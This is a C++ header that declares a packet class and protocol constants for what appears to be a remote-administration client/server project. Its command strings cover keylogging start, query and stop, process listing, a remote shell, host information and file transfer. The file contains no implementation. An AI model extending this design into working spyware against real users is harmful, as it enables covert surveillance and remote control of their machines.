#ifndef LPTF_PACKET_H
#define LPTF_PACKET_H

#include <stdlib.h>
#include <stdint.h>


#define REPLY_PACKET 0
#define MESSAGE_PACKET 1
#define COMMAND_PACKET 2
#define BINARY_PACKET 3
#define FILE_PART_PACKET 4
#define FILE_TRANSFER_REQ_PACKET 5

#define ERROR_PACKET 0xFF   // a packet type should not be higher than this value


// commands available for COMMAND packet
#define HOST_INFO_COMMAND "HOST_INFO"
#define START_KEYLOG_COMMAND "START_KEYLOG"
#define QUERY_KEYLOG_COMMAND "QUERY_KEYLOG"
#define STOP_KEYLOG_COMMAND "STOP_KEYLOG"
#define LIST_PROC_COMMAND "LIST_PROC"
#define SHELL_COMMAND "SHELL"

// command error codes
#define ERR_CMD_FAILURE 0
#define ERR_CMD_UNKNOWN 1

#define MAX_FILE_PART_BYTES UINT16_MAX - (sizeof(PACKET_HEADER) + sizeof(uint32_t) + sizeof(uint32_t))


typedef struct {
    uint16_t length;
    uint8_t type;
    uint8_t reserved;
} PACKET_HEADER;


class LPTF_Packet {
    private:
        PACKET_HEADER header;
        void *content;
    public:
        LPTF_Packet();

        LPTF_Packet(uint8_t type, void *rawcontent, uint16_t datalen);

        LPTF_Packet(void *rawpacket, size_t buffmaxsize);

        LPTF_Packet(const LPTF_Packet &src);

        ~LPTF_Packet();

        LPTF_Packet &operator=(const LPTF_Packet &src);
        
        uint8_t type();

        uint16_t size();

        const void *get_content();
        const PACKET_HEADER get_header();

        virtual void *data();

        void print_specs();
};

#endif